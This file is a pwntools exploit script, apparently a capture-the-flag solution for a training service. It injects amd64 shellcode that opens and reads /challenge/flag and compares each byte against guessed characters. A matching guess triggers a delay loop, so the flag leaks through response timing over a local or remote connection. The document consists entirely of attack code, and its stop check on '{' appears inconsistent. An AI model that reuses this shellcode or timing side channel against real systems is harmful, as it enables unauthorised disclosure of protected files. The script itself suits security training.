from pwn import *
import string

context.arch = "amd64"
context.log_level = "error"

flag = ""

for index in range(0, 101):
    for char in range(0x21, 0x7f):
        time.sleep(0.2)
        shellcode = f"""
        open:
            xor rax, rax
            mov rax, 0x02
            mov rdi, 0x0067616c662f6567
            push rdi
            mov rdi, 0x6e656c6c6168632f
            push rdi
            mov rdi, rsp
            xor rsi, rsi
            xor rdx, rdx
            syscall
            mov rdi, rax
        read:
            xor rax, rax
            mov rdx, 100
            mov rsi, rsp
            syscall

            lea rsi, [rsp]
            add rsi, {index}
        check_loop:
            movzx rax, byte ptr [rsi]
            cmp al, {char}
            mov rcx, 60000000
            je delay
            jmp exit
            
        delay:
            dec rcx                
            jnz delay

        exit:
            mov rax, 60           
            xor rdi, rdi           
            syscall
        """

        if args.REMOTE:
            c = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
        else: 
            c = process("./wrapper.py")
        
        c.recvuntil(b"Shellcode: ")
        shellcode = asm(shellcode)
        c.sendline(shellcode + b"\x90" * (1024 - len(shellcode)))
        c.recvline()
        #print(f"Trying {char} at index {index}")
        timing = c.recvline()
        if b"0.02" in timing:
            flag += chr(char)
            print(f"Flag: {flag}")
            if chr(char) == "{":
                sys.exit()
            break 
        c.close()
        
